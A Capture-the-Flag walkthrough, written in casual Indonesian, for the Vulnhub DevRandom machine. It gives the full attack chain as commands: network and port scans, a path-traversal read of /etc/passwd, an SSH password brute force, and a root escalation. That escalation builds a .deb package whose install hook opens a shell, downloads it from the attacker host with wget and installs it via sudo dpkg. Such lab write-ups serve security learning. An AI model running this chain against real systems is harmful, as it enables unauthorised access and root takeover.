@@ -1,0 +1,47 @@
+Walkthrough DevRandom Vulnhub
+IP : 192.168.88.182
+Link : https://www.vulnhub.com/entry/devrandom-ctf-11,450/
+Mission : Got the root flag
+
+1. Oke gan kali ini pake bahasa indo. Oke pertama yang harus kita lakuin ialah meng-scan semua ip
+Command : sudo netdiscover -i eth0 -r 192.168.88.0/24
+Ouput : Oke untuk ouput singkat aja dapat ip 192.168.88.182
+
+2. sudo nmap -sS -sC -sV -A -p- 192.168.88.182
+Ouput : Terbuka port 22 (ssh) dan port 80 (http)
+
+3. gobuster dir http://192.168.88.182/ -x php,html,js --wordlist ~/Downloads/directory-list-2.3-medium.txt -o direc.txt
+Ouput : 
+/robots.txt
+/wp-admin
+/wp-login.php
+/wp-signup.php
+/secret
+/secret.php
+
+4. Next search ke google : http//192.168.88.182/?include=../../../../../etc/passwd
+Ouput : Untuk ini lupa ku catet wkw, secara garis besar terdapat user john & trevor
+
+5. Oke sbenarnya ada password john tapi itu prank wkwk asli. Oleh karena itu kita bruteforce ssh dengan user trevor
+Command : ncrack -v -f --user trevor -P ~/Downloads/rockyou.txt 192.168.88.182:22
+Output : trevor:qwertyuiop[]
+
+6. Oke now login with ssh : ssh trevor@192.168.88.182 
+
+7. Oke karena flag terdapat di root, seperti biasa liat di bagian "id" untuk tahu vuln sudo nya 
+Command : sudo -l 
+Output : Dan ternyata vulnnya yaitu dpkg
+
+8. Oke selanjutnya cd /tmp
+
+9. Berpindah ke Kali kita buat sebuah file dpkg 
+Command : TF=$(mktemp -d); echo 'exec /bin/sh' > $TF/x.sh; fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF; python -m SimpleHTTPServer
+Output : path => x_1.0_all.deb
+Note : Untuk fpm kalian bisa dapat denngan gem install fpm 
+
+10. Kembali ke server , selanjutnya kita : wget http://192.168.88.239:8000/x_1.0_all.deb 
+Note : ip sesuaikan dengan ip kali linux atau ip server yang membuat backdoor dpkg nya
+
+11. sudo dpkg -i x_1.0_all.deb; id; cd /root; cat flag.txt
+Output : echo "THISISTHEFLAGTHISISTHEFLAG\!\!\!\@\@\@###" | base64 > thisistheflag.txt
+Ouput2 : VEhJU0lTVEhFRkxBR1RISVNJU1RIRUZMQUdcIVwhXCFcQFxAXEAjIyMK
